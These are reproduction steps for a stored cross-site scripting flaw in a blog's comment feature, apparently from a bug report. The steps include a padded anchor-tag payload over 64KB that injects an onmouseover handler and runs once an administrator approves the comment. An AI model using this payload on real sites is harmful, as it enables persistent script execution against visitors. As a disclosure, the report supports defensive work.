Steps to duplicate issue:
- On a post, there must be a pre-existing comment
- Inject attack as a comment using the following, note the inject must be greater than 64KB: 
  - ```<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>```
- At this point, the inject works and conducts the XSS attack on the attackers side
- If administrator approves the comment, the attack can be perpetually executed when victims view the comment
